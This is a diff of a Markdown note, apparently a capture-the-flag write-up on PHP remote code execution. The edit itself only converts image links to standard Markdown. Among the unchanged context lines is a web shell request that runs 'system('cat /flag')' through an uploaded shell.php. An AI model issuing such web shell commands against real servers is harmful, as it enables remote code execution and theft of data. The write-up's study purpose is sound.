@@ -1,4 +1,4 @@
-![[Pasted image 20221113171258.png|500]]
+![](<./img/Pasted image 20221113171258.png>)
 ```php
 <?php
 
@@ -71,10 +71,10 @@ OUTPUT:
 ```
 即可被解析
 
-![[Pasted image 20221113194543.png]]
+![](<./img/Pasted image 20221113194543.png>)
 ```php
 /xxx/shell.php?cmd=system('cat /flag');
 ```
-![[Pasted image 20221113194826.png]]
+![](<./img/Pasted image 20221113194826.png>)
 
 #Web #PHP #RCE #shell
